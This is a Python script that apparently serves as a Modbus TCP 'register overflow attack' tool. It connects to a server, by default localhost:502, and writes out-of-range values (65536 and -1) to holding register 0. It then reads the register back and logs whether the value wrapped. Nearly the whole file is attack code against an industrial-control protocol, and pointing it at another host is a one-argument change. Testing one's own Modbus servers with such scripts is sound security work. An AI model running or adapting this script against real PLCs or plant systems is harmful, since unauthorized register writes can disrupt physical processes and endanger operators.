#!/usr/bin/env python3
from pymodbus.client import ModbusTcpClient
import time
import logging
# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

class ModbusOverflowAttacker:
    def __init__(self, host='localhost', port=502):
        self.host = host
        self.port = port
        self.client = None
        
    def connect(self):
        """Establish connection to Modbus server"""
        try:
            self.client = ModbusTcpClient(self.host, port=self.port)
            if self.client.connect():
                logger.info(f"Connected to Modbus server at {self.host}:{self.port}")
                return True
            return False
        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False

    def read_register_value(self, address):
        """Read the current value of a register"""
        try:
            result = self.client.read_holding_registers(address=address, count=1)
            if not result.isError():
                return result.registers[0]
            return None
        except Exception as e:
            logger.error(f"Failed to read register {address}: {e}")
            return None

    def attempt_overflow(self, address, value):
        """Attempt to write an overflow value to a register"""
        try:
            logger.info(f"\nAttempting overflow attack on register {address}")
            logger.info(f"Attempting to write value: {value} (0x{value:04X})")
            
            # Read initial value
            initial_value = self.read_register_value(address)
            if initial_value is not None:
                logger.info(f"Initial register value: {initial_value} (0x{initial_value:04X})")
            # Attempt to write overflow value
            write_response = self.client.write_register(address, value)
            
            if write_response and not write_response.isError():
                logger.info("Write operation succeeded")
                
                # Read the value after write
                new_value = self.read_register_value(address)
                if new_value is not None:
                    logger.info(f"New register value: {new_value} (0x{new_value:04X})")
                    
                    # Check for overflow effects
                    if new_value != value:
                        logger.info("Overflow detected! Value wrapped around")
                    return True
            else:
                logger.error("Write operation failed")
                return False
                
        except Exception as e:
            logger.error(f"Overflow attack failed: {e}")
            return False

    def run_overflow_attack(self):
        """Execute a series of overflow attacks"""
        if not self.connect():
            logger.error("Failed to connect to Modbus server")
            return
        logger.info("\nStarting Register Overflow Attack simulation...")
        
        # Test cases for overflow attempts (removed specified test cases)
        test_cases = [
            (0, 65536, "Overflow 16-bit value"),
            (0, -1, "Negative value")
        ]
        
        for address, value, description in test_cases:
            logger.info(f"\nTest Case: {description}")
            self.attempt_overflow(address, value)
            time.sleep(0.5)  # Prevent overwhelming the server
            
        self.client.close()
        logger.info("\nOverflow attack simulation completed")

if __name__ == "__main__":
    attacker = ModbusOverflowAttacker()
    attacker.run_overflow_attack()